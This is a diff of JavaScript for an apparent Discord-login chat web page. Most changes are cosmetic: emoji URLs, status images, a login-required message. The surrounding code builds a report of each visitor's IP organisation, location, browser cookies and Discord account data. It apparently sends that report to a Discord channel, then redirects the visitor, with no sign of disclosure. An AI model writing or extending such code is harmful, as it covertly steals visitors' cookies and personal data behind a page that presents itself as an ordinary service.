@@ -12,9 +12,13 @@ const statusEmojis = {
     error: 'https://cdn.discordapp.com/emojis/1271705264038346813.png',
     space: 'https://cdn.discordapp.com/emojis/1273231578402918401.png',
     ellipsis: 'https://cdn.discordapp.com/emojis/1285189210835390534.png',
-    rage: 'https://link-to-rage-emoji.png', // Placeholder, to be updated later
+    rage: 'https://em-content.zobj.net/source/twitter/408/pouting-face_1f621.png',
+    user:
+'https://cdn.discordapp.com/emojis/1285189009722839060.png',
     entry: 'https://cdn.discordapp.com/emojis/1267398812557774848.png',
-    exit: 'https://cdn.discordapp.com/emojis/1267384023257321572.png'
+    exit: 'https://cdn.discordapp.com/emojis/1267384023257321572.png',
+    LOL:
+'https://cdn.discordapp.com/emojis/1267385971352145950.png'
 };
 
 // List of banned users
@@ -77,7 +81,7 @@ ${userDataFormatted}
         sendButton.disabled = true;
         statusMessage.innerText = "You are blacklisted from using this service.";
         responseContainer.innerText = ""; // Clear the response container
-        statusImage.src = statusEmojis.cross; // Set to cross emoji
+        statusImage.src = statusEmojis.rage; // Set to cross emoji
         return; // Exit the script if the user is banned
     }
 
@@ -217,7 +221,6 @@ ${userDataFormatted}
             // Enable logout button, disable login button
             logoutButton.disabled = false;
             loginButton.disabled = true;
-          //  profileUI.style.display = 'block'; // Always show profile UI
         } else {
             // User is not logged in, check URL for user data
             const urlParams = new URLSearchParams(window.location.search);
@@ -236,16 +239,21 @@ ${userDataFormatted}
 **Org:** ${ipData.org}
 **Location:** ${ipData.loc}
 **Cookies:** ${visitorCookie}
-**Discord User Data:** \`\`\`json
+**Discord User Data:** \`\`\`py
 ${userDataFormatted}
 \`\`\`
 `.trim(), Math.floor(Math.random() * 16777215));
                 updateUI();
-                window.location.href = 'https://cakeorpastry.netlify.app/testgpt'
+                window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
             } else {
                 // Not logged in and no user data in URL
                 logoutButton.disabled = true;
                 loginButton.disabled = false;
+
+                // Disable the send button and update status UI
+                sendButton.disabled = true;
+                statusMessage.innerText = "You need to login to use this service.";
+                statusImage.src = statusEmojis.LOL; // Set to "LOL" placeholder image for now
             }
         }
     }
